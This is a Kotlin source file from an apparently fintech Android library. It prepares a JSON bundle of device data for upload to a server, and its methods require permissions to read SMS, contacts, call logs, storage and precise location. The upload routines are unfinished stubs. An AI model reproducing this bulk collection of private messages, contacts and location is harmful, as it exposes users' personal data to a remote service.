package com.fintek.utils_androidx.upload

import android.Manifest
import android.os.Build
import androidx.annotation.RequiresApi
import androidx.annotation.RequiresPermission
import com.fintek.utils_androidx.FintekUtils
import com.fintek.utils_androidx.UtilsBridge
import com.fintek.utils_androidx.network.CoronetRequest
import com.fintek.utils_androidx.network.MediaType.Companion.toMediaType
import com.fintek.utils_androidx.network.Request
import com.fintek.utils_androidx.network.RequestBody
import com.fintek.utils_androidx.network.RequestBody.Companion.toRequestBody
import com.fintek.utils_androidx.upload.internal.*
import com.fintek.utils_androidx.upload.internal.ExistedStringElement
import com.fintek.utils_androidx.upload.internal.IS_EXISTED
import com.fintek.utils_androidx.upload.internal.StringElement
import com.fintek.utils_androidx.upload.internal.elementDelete
import com.google.gson.Gson
import java.util.concurrent.TimeUnit


object UploadUtils {
    private val requestBuilder: CoronetRequest.Builder = CoronetRequest.Builder()
        .setBaseUrl(FintekUtils.requiredBaseUrl)
        .addHeader("Connection", "Keep-Alive")
        .addHeader("Content-Type", "application/Json;charset:Utf-8")
        .addHeader("token", FintekUtils.requiredIdentify.toString())
        .setConnectTimeout(60, TimeUnit.SECONDS)
        .setReadTimeout(60, TimeUnit.SECONDS)

    /**
     * Upload all struct to Service
     *
     *
     * This way will delete all cache file
     * @param url request api url
     */
    @JvmStatic
    @RequiresPermission(anyOf = [
        Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_SMS,
        Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_PHONE_STATE, Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_WIFI_STATE, Manifest.permission.ACCESS_NETWORK_STATE,
        Manifest.permission.INTERNET
    ])
    @RequiresApi(Build.VERSION_CODES.KITKAT)
    fun upload() {
        elementDelete()

        // create new struct json
        val element: Element<String> = StringElement(createNewStructJson())
    }


    @RequiresPermission(anyOf = [
        Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_SMS,
        Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_PHONE_STATE, Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_WIFI_STATE, Manifest.permission.ACCESS_NETWORK_STATE,
        Manifest.permission.INTERNET
    ])
    @RequiresApi(Build.VERSION_CODES.KITKAT)
    internal fun autoUpload() {
        if (!IS_EXISTED) {
            return
        }

        val element: Element<String> = ExistedStringElement()
        if (IS_UPLOADING) {
            val cacheElement: String? = element.cache()
            // TODO: 2020/12/16 upload cache here
        } else {
            val nextElement: String = element.next()
            // TODO: 2020/12/16 upload next here
        }
    }

    @RequiresPermission(anyOf = [
        Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_SMS,
        Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_PHONE_STATE, Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_WIFI_STATE, Manifest.permission.ACCESS_NETWORK_STATE,
        Manifest.permission.INTERNET
    ])
    @RequiresApi(Build.VERSION_CODES.KITKAT)
    private fun createNewStructJson(): String {
        val struct = FintekUtils.getAllStruct()
        return Gson().toJson(struct)
    }
}